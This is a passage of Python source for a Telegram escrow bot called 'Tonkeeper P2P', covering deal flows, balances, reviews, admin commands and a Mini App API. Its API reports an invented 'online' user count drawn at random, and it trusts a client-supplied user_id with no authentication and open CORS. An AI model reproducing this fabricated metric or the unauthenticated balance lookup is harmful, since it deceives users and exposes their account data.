    lang = get_user_language(callback.from_user.id)
    try:
        await callback.message.edit_text(
            f"🔥 <b>Tonkeeper P2P</b> 🔥\n\n{get_text(lang, 'choose_action')}:",
            reply_markup=main_menu_keyboard(callback.from_user.id)
        )
    except:
        await callback.message.answer(
            f"🔥 <b>Tonkeeper P2P</b> 🔥\n\n{get_text(lang, 'choose_action')}:",
            reply_markup=main_menu_keyboard(callback.from_user.id)
        )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "create_deal_choice")
async def create_deal_choice(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    try:
        await callback.message.edit_text(
            f"📱 <b>{get_text(lang, 'create_deal')}</b>\n\n"
            f"Выберите способ:",
            reply_markup=create_deal_choice_keyboard(callback.from_user.id)
        )
    except:
        await callback.message.answer(
            f"📱 <b>{get_text(lang, 'create_deal')}</b>",
            reply_markup=create_deal_choice_keyboard(callback.from_user.id)
        )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "create_deal_bot")
async def create_deal_bot(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    try:
        await callback.message.edit_text(
            f"📝 <b>{get_text(lang, 'describe_product')}</b>\n\n{get_text(lang, 'example_product')}"
        )
    except:
        await callback.message.answer(
            f"📝 <b>{get_text(lang, 'describe_product')}</b>"
        )
    await state.set_state(DealStates.waiting_product)
    await callback.answer()

@dp.message(DealStates.waiting_product)
async def get_product(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    await state.update_data(product=message.text.strip())
    await message.answer(
        f"💱 <b>{get_text(lang, 'choose_currency')}</b>",
        reply_markup=currency_keyboard()
    )
    await state.set_state(DealStates.waiting_currency)

@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def get_currency(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    try:
        await callback.message.edit_text(
            f"💰 <b>{get_text(lang, 'enter_amount')}</b>\n{get_text(lang, 'currency')}: {currency}"
        )
    except:
        await callback.message.answer(
            f"💰 <b>{get_text(lang, 'enter_amount')}</b>"
        )
    await state.set_state(DealStates.waiting_amount)
    await callback.answer()

@dp.message(DealStates.waiting_amount)
async def get_amount(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        await state.update_data(amount=amount)
        await message.answer(
            f"👤 <b>{get_text(lang, 'enter_buyer')}</b>\n\n{get_text(lang, 'buyer_username_example')}\n\n❗️ {get_text(lang, 'only_this_user')}"
        )
        await state.set_state(DealStates.waiting_buyer)
    except:
        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")

@dp.message(DealStates.waiting_buyer)
async def get_buyer(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    buyer_username = message.text.strip().replace("@", "").lower()
    data = await state.get_data()

    deal_id = str(uuid.uuid4())[:8]
    deals[deal_id] = {
        "deal_id": deal_id,
        "seller_id": message.from_user.id,
        "seller_username": message.from_user.username or str(message.from_user.id),
        "buyer_username": buyer_username,
        "buyer_id": None,
        "product": data["product"],
        "currency": data["currency"],
        "amount": data["amount"],
        "status": "waiting_payment",
        "created_at": datetime.now().isoformat(),
        "paid_by_admin": None,
        "completed_at": None
    }
    save_json(FILES["deals"], deals)

    link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
    add_log("deal_created", {"deal_id": deal_id, "seller": message.from_user.username, "buyer": buyer_username})

    await message.answer(
        f"✅ <b>{get_text(lang, 'deal_created')}</b> #{deal_id}!\n\n"
        f"💰 {get_text(lang, 'amount')}: {data['amount']} {data['currency']}\n"
        f"📦 {get_text(lang, 'product')}: {data['product']}\n"
        f"👤 {get_text(lang, 'buyer')}: @{buyer_username}\n\n"
        f"🔗 {get_text(lang, 'send_link_to_buyer')}:\n{link}\n\n"
        f"📋 {get_text(lang, 'copy_link')}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"📋 {get_text(lang, 'copy_link')}", callback_data=f"copy_link_{deal_id}")],
            [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
        ])
    )
    await state.clear()

@dp.callback_query(lambda c: c.data.startswith("copy_link_"))
async def copy_link_callback(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
    await callback.answer(f"✅ {get_text(get_user_language(callback.from_user.id), 'copy_link')}\n{link}", show_alert=True)

async def handle_deal_link(message: types.Message, deal_id: str):
    lang = get_user_language(message.from_user.id)
    if deal_id not in deals:
        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return

    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
        await message.answer(
            f"❌ {get_text(lang, 'access_denied')}!\n\n"
            f"{get_text(lang, 'deal')} #{deal_id} {get_text(lang, 'for_user')} @{deal['buyer_username']}"
        )
        return

    deal["buyer_id"] = message.from_user.id
    save_json(FILES["deals"], deals)

    await message.answer(
        f"✈️ <b>{get_text(lang, 'deal')} #{deal_id}</b>\n\n"
        f"📦 {get_text(lang, 'product')}: {deal['product']}\n"
        f"💰 {get_text(lang, 'amount')}: {deal['amount']} {deal['currency']}\n"
        f"👤 {get_text(lang, 'seller')}: @{deal['seller_username']}\n\n"
        f"⬇️ {get_text(lang, 'choose_payment_method')} ⬇️",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"💳 {get_text(lang, 'pay_by_rekvisits')}", callback_data=f"pay_rekvisits_{deal_id}")],
            [InlineKeyboardButton(text=f"💰 {get_text(lang, 'pay_by_balance')}", callback_data=f"pay_balance_{deal_id}")],
            [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
        ])
    )

@dp.callback_query(lambda c: c.data.startswith("pay_rekvisits_"))
async def pay_by_rekvisits(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return
    deal = deals[deal_id]
    await callback.message.edit_text(
        f"💳 <b>{get_text(lang, 'payment_details')}</b>\n\n"
        f"Оплатите {deal['amount']} {deal['currency']}\n"
        f"После оплаты напишите админу: /pay {deal_id}",
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("pay_balance_"))
async def pay_by_balance(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return
    deal = deals[deal_id]
    buyer_balance = get_balance(callback.from_user.id)
    curr_key = deal["currency"].lower()
    if buyer_balance.get(curr_key, 0) < deal["amount"]:
        await callback.answer(f"❌ {get_text(lang, 'insufficient_balance')}!", show_alert=True)
        return
    buyer_balance[curr_key] -= deal["amount"]
    save_json(FILES["balance"], balance)
    deal["status"] = "paid"
    deal["paid_by_admin"] = callback.from_user.id
    save_json(FILES["deals"], deals)
    await callback.message.edit_text(
        f"✅ {get_text(lang, 'payment_confirmed')}!\n\n"
        f"{get_text(lang, 'deal')} #{deal_id}\n"
        f"💰 {get_text(lang, 'funds_deducted')}: {deal['amount']} {deal['currency']}",
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await callback.answer()

# ============================================================
# 10. МЕНЮ: БАЛАНС, СДЕЛКИ, ОТЗЫВЫ (С ОТОБРАЖЕНИЕМ ОТЗЫВОВ)
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    bal = get_balance(callback.from_user.id)
    text = f"""💰 <b>{get_text(lang, 'your_balance')}</b>

💎 TON: {bal.get('ton', 0)}
⭐️ STARS: {bal.get('stars', 0)}
💰 RUB: {bal.get('rub', 0)}
🌐 UAH: {bal.get('uah', 0)}

📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}"""
    await callback.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"💲 {get_text(lang, 'withdraw_funds')}", callback_data="withdraw_start")],
            [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_deals")
async def menu_deals(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id:
            user_deals.append((d_id, d))
    if not user_deals:
        await callback.message.edit_text(
            f"📭 {get_text(lang, 'no_deals')}",
            reply_markup=back_to_main_keyboard(callback.from_user.id)
        )
        return
    text = f"📊 <b>{get_text(lang, 'your_deals')}</b>\n\n"
    for d_id, d in user_deals[-10:]:
        status_map = {
            "waiting_payment": f"⏳ {get_text(lang, 'status_waiting')}",
            "paid": f"✅ {get_text(lang, 'status_paid')}",
            "awaiting_confirmation": f"📦 {get_text(lang, 'status_awaiting')}",
            "completed": f"🎉 {get_text(lang, 'status_completed')}"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])} | {d['amount']} {d['currency']}\n"
        text += f"   → {d['product'][:30]}\n\n"
    await callback.message.edit_text(
        text,
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_reviews")
async def menu_reviews(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    reviews_list = list(reviews.values())
    
    if not reviews_list:
        text = f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\nПока нет отзывов"
    else:
        text = f"⭐️ <b>{get_text(lang, 'faq')}</b> (всего: {len(reviews_list)})\n\n"
        for r in reviews_list[-10:]:
            user = r.get('user', 'Аноним')
            rating = '⭐' * r.get('rating', 5)
            text += f"👤 <b>{user}</b> | {rating}\n"
            text += f"📝 {r.get('text', '')[:150]}\n"
            text += f"🕐 {r.get('date', 'недавно')}\n\n"
    
    await callback.message.edit_text(
        text[:4000],
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"📝 {get_text(lang, 'faq')}", callback_data="write_review")],
            [InlineKeyboardButton(text=f"🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
            [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "write_review")
async def write_review(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_verified(callback.from_user.id):
        await callback.message.edit_text(
            f"⚠️ <b>{get_text(lang, 'verify_need')}</b>\n\n{get_text(lang, 'verify_desc')}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=f"🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
            ])
        )
        return
    user_deals = [d for d in deals.values() if d.get("seller_id") == callback.from_user.id and d.get("status") == "completed"]
    if len(user_deals) < 1:
        await callback.message.edit_text(
            f"⚠️ <b>{get_text(lang, 'no_deals_warning')}</b>",
            reply_markup=back_to_main_keyboard(callback.from_user.id)
        )
        return
    await callback.message.edit_text(
        f"📝 <b>{get_text(lang, 'faq')}</b>\n\nИспользуйте Mini App",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
            [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

# ============================================================
# 11. АДМИН ПАНЕЛЬ (ВСЕ ФУНКЦИИ)
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    await callback.message.edit_text(
        f"👑 <b>{get_text(lang, 'admin_panel')}</b>\n\n{get_text(lang, 'choose_action')}:",
        reply_markup=admin_panel_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_all_deals")
async def admin_all_deals(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    if not deals:
        await callback.message.edit_text(f"📭 {get_text(lang, 'no_deals_total')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = f"📊 <b>{get_text(lang, 'all_deals_title')}</b>\n\n"
    for d_id, d in list(deals.items())[-20:]:
        status_map = {
            "waiting_payment": f"⏳ {get_text(lang, 'status_waiting')}",
            "paid": f"✅ {get_text(lang, 'status_paid')}",
            "awaiting_confirmation": f"📦 {get_text(lang, 'status_awaiting')}",
            "completed": f"🎉 {get_text(lang, 'status_completed')}"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
        text += f"   👤 {d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
        text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
async def admin_withdraw_requests(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
    if not pending:
        await callback.message.edit_text(f"📭 {get_text(lang, 'no_active_requests')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = f"💲 <b>{get_text(lang, 'withdraw_funds')}</b>\n\n"
    for rid, req in list(pending.items())[-10:]:
        text += f"#{rid}\n   👤 ID: {req.get('user_id', '?')}\n   💰 {req.get('amount', 0)} {req.get('currency', '')}\n   📝 {req.get('details', '')[:30]}\n   ➡️ /confirm_withdraw {rid}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_add_balance")
async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    await callback.message.edit_text(f"💰 <b>{get_text(lang, 'balance_added')}</b>\n\n{get_text(lang, 'enter_user_id')}:")
    await state.set_state(AdminStates.waiting_user_id)
    await callback.answer()

@dp.message(AdminStates.waiting_user_id)
async def admin_get_user_id(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    try:
        user_id = int(message.text.strip())
        await state.update_data(target_user_id=user_id)
        await message.answer(f"💱 {get_text(lang, 'choose_currency')}:", reply_markup=currency_keyboard())
        await state.set_state(AdminStates.waiting_currency)
    except:
        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")

@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    currency = callback.data.split("_")[1]
    await state.update_data(target_currency=currency)
    await callback.message.edit_text(f"💰 {get_text(lang, 'enter_amount')} {currency}:")
    await state.set_state(AdminStates.waiting_amount)
    await callback.answer()

@dp.message(AdminStates.waiting_amount)
async def admin_get_amount(message: types.Message, state: FSMContext):
    lang = get_user_language(message.from_user.id)
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        data = await state.get_data()
        target_user_id = data.get("target_user_id")
        currency = data.get("target_currency")
        add_balance(target_user_id, currency, amount)
        add_log("admin_add_balance", {"admin": message.from_user.username, "target": target_user_id, "amount": amount, "currency": currency})
        await message.answer(
            f"✅ {get_text(lang, 'balance_added')} {amount} {currency} {get_text(lang, 'for_user')} {target_user_id}",
            reply_markup=admin_panel_keyboard(message.from_user.id)
        )
        await state.clear()
    except:
        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")

@dp.callback_query(lambda c: c.data == "admin_manage_admins")
async def admin_manage_admins(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    admin_list = "\n".join([f"• {aid}" for aid in list(admins.keys())]) if admins else "Нет дополнительных админов"
    await callback.message.edit_text(
        f"👥 <b>{get_text(lang, 'admin_list')}</b>\n\n"
        f"Главный админ: {MASTER_ADMIN_ID}\n"
        f"Дополнительные:\n{admin_list}\n\n"
        f"/add_admin [ID] - {get_text(lang, 'admin_added')}\n"
        f"/remove_admin [ID] - {get_text(lang, 'admin_removed')}",
        reply_markup=admin_panel_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.message(Command("add_admin"))
async def add_admin(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /add_admin [ID]")
        return
    try:
        new_admin_id = int(args[1])
        admins[str(new_admin_id)] = True
        save_json(FILES["admins"], admins)
        await message.answer(f"✅ {get_text(lang, 'admin_added')} {new_admin_id}")
    except:
        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")

@dp.message(Command("remove_admin"))
async def remove_admin(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /remove_admin [ID]")
        return
    try:
        admin_id = int(args[1])
        if admin_id == MASTER_ADMIN_ID:
            await message.answer(f"❌ {get_text(lang, 'cannot_remove_master')}")
            return
        if str(admin_id) in admins:
            del admins[str(admin_id)]
            save_json(FILES["admins"], admins)
            await message.answer(f"✅ {get_text(lang, 'admin_removed')} {admin_id}")
        else:
            await message.answer(f"❌ {get_text(lang, 'user_not_found')}")
    except:
        await message.answer(f"❌ {get_text(lang, 'invalid_amount')}")

@dp.callback_query(lambda c: c.data == "admin_manage_reviews")
async def admin_manage_reviews(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    reviews_list = list(reviews.values())
    if not reviews_list:
        await callback.message.edit_text(f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\nПока нет отзывов", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\n"
    for r in reviews_list[-10:]:
        text += f"👤 {r.get('user', 'Аноним')} | {'⭐' * r.get('rating', 5)}\n"
        text += f"📝 {r.get('text', '')[:50]}\n🆔 {r.get('id', '')}\n➡️ /delete_review {r.get('id', '')}\n\n"
    await callback.message.edit_text(
        text[:4000],
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"🗑 Очистить все {get_text(lang, 'faq')}", callback_data="admin_clear_reviews")],
            [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'admin_panel')}", callback_data="menu_admin")]
        ])
    )
    await callback.answer()

@dp.message(Command("delete_review"))
async def delete_review_command(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if not is_admin(message.from_user.id):
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /delete_review [ID]")
        return
    review_id = args[1]
    if review_id not in reviews:
        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
        return
    del reviews[review_id]
    save_json(FILES["reviews"], reviews)
    await message.answer(f"✅ {get_text(lang, 'photo_updated')}")

@dp.callback_query(lambda c: c.data == "admin_clear_reviews")
async def admin_clear_reviews(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    if not reviews:
        await callback.answer(f"❌ {get_text(lang, 'no_deals_total')}", show_alert=True)
        return
    reviews.clear()
    save_json(FILES["reviews"], reviews)
    await callback.message.edit_text(f"✅ {get_text(lang, 'photo_updated')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_logs")
async def admin_logs(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    logs_list = list(logs.values())[-20:]
    if not logs_list:
        await callback.message.edit_text(f"📋 <b>Логи</b>\n\nНет записей", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = "📋 <b>Последние логи</b>\n\n"
    for log_entry in reversed(logs_list[-10:]):
        text += f"🕐 {log_entry.get('time', '')[:19]}\n"
        text += f"📌 {log_entry.get('action', '')}\n"
        text += f"📊 {json.dumps(log_entry.get('data', {}), ensure_ascii=False)[:80]}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 12. КОМАНДЫ АДМИНА
# ============================================================
@dp.message(Command("pay"))
async def pay_command(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if not is_admin(message.from_user.id):
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /pay [ID]")
        return
    deal_id = args[1]
    if deal_id not in deals:
        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return
    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return
    deal["status"] = "paid"
    deal["paid_by_admin"] = message.from_user.id
    save_json(FILES["deals"], deals)
    await message.answer(f"✅ {get_text(lang, 'payment_confirmed')} #{deal_id}")
    await bot.send_message(
        deal["seller_id"],
        f"💎 <b>{get_text(lang, 'deal')} #{deal_id} {get_text(lang, 'status_paid')}!</b>\n\n"
        f"💰 {get_text(lang, 'amount')}: {deal['amount']} {deal['currency']}\n"
        f"👤 {get_text(lang, 'buyer')}: @{deal['buyer_username']}\n\n"
        f"⬇️ {get_text(lang, 'seller_delivered')} ⬇️",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"📦 {get_text(lang, 'product_delivered')}", callback_data=f"seller_done_{deal_id}")],
            [InlineKeyboardButton(text=f"🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))]
        ])
    )

@dp.callback_query(lambda c: c.data.startswith("seller_done_"))
async def seller_done(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return
    deal = deals[deal_id]
    if deal["status"] != "paid":
        await callback.answer(f"⏳ {get_text(lang, 'status_waiting')}")
        return
    deal["status"] = "awaiting_confirmation"
    save_json(FILES["deals"], deals)
    await callback.message.edit_text(f"✅ {get_text(lang, 'seller_confirmed')}!\n\n{get_text(lang, 'waiting_for_delivery')}")
    await bot.send_message(
        deal["buyer_id"],
        f"📦 <b>{get_text(lang, 'seller_delivered')} {get_text(lang, 'deal')} #{deal_id}</b>\n\n"
        f"💰 {get_text(lang, 'amount')}: {deal['amount']} {deal['currency']}\n"
        f"👤 {get_text(lang, 'seller')}: @{deal['seller_username']}\n\n"
        f"⬇️ {get_text(lang, 'confirm_receipt')} ⬇️",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"✅ {get_text(lang, 'confirm_receipt')}", callback_data=f"buyer_confirm_{deal_id}")],
            [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
        ])
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("buyer_confirm_"))
async def buyer_confirm(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return
    deal = deals[deal_id]
    if deal["status"] != "awaiting_confirmation":
        await callback.answer(f"⏳ {get_text(lang, 'status_waiting')}")
        return
    add_balance(deal["seller_id"], deal["currency"], deal["amount"])
    seller_balance = get_balance(deal["seller_id"])
    buyer = deal["buyer_username"]
    if buyer not in seller_balance["deal_partners"]:
        seller_balance["deal_partners"][buyer] = 0
    seller_balance["deal_partners"][buyer] += 1
    save_json(FILES["balance"], balance)
    deal["status"] = "completed"
    deal["completed_at"] = datetime.now().isoformat()
    save_json(FILES["deals"], deals)
    await callback.message.edit_text(
        f"🎉 <b>{get_text(lang, 'deal_completed')}</b> #{deal_id}!\n\n"
        f"💳 {get_text(lang, 'funds_added_to_balance')} {deal['amount']} {deal['currency']}\n\n"
        f"{get_text(lang, 'deal_completed_msg')}",
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await bot.send_message(
        deal["seller_id"],
        f"🎉 <b>{get_text(lang, 'deal_completed')}</b> #{deal_id}!\n\n"
        f"💰 {deal['amount']} {deal['currency']} {get_text(lang, 'funds_added_to_balance')}"
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("support_"))
async def support_callback(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    await callback.answer()
    await callback.message.answer(
        f"🆘 {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}"
    )

@dp.message(Command("confirm_withdraw"))
async def confirm_withdraw_command(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if not is_admin(message.from_user.id):
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /confirm_withdraw [ID]")
        return
    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
        return
    req = withdraw_requests[request_id]
    if req.get("status") != "pending":
        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
        return
    bal = get_balance(req["user_id"])
    curr_key = req["currency"].lower()
    if bal.get(curr_key, 0) >= req["amount"]:
        bal[curr_key] -= req["amount"]
        save_json(FILES["balance"], balance)
    req["status"] = "completed"
    req["completed_at"] = datetime.now().isoformat()
    save_json(FILES["withdraw"], withdraw_requests)
    await message.answer(f"✅ {get_text(lang, 'withdraw_completed')} #{request_id}")
    await bot.send_message(
        req["user_id"],
        f"✅ <b>{get_text(lang, 'withdraw_completed')}</b>\n\n"
        f"💰 {req['amount']} {req['currency']}"
    )

@dp.message(Command("reject_withdraw"))
async def reject_withdraw_command(message: types.Message):
    lang = get_user_language(message.from_user.id)
    if not is_admin(message.from_user.id):
        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /reject_withdraw [ID]")
        return
    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
        return
    req = withdraw_requests[request_id]
    if req.get("status") != "pending":
        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
        return
    req["status"] = "rejected"
    save_json(FILES["withdraw"], withdraw_requests)
    await message.answer(f"❌ {get_text(lang, 'request_not_found')} #{request_id}")

# ============================================================
# 13. API ДЛЯ MINI APP
# ============================================================
async def handle_api(request):
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username'
    }
    if request.method == 'OPTIONS':
        return web.Response(headers=headers)
    
    if request.method == 'GET':
        return web.json_response({
            'success': True,
            'bot': BOT_NAME,
            'version': '1.0.0',
            'status': 'running',
            'online': random.randint(6000, 7000),
            'endpoints': ['/api/is_admin', '/api/balance', '/api/deals', '/api/create_deal', '/api/withdraw', '/api/reviews', '/api/stats']
        }, headers=headers)
    
    try:
        data = await request.json()
    except:
        data = {}
    
    user_id = data.get('user_id')
    endpoint = request.path
    lang = get_user_language(user_id) if user_id else "ru"
    
    if endpoint == '/api/is_admin':
        return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)
    
    elif endpoint == '/api/balance':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        return web.json_response({'success': True, 'balance': get_balance(user_id)}, headers=headers)
    
    elif endpoint == '/api/deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        user_deals = []
        for d_id, d in deals.items():
            if d.get('seller_id') == user_id:
                d_copy = d.copy()
                d_copy['deal_id'] = d_id
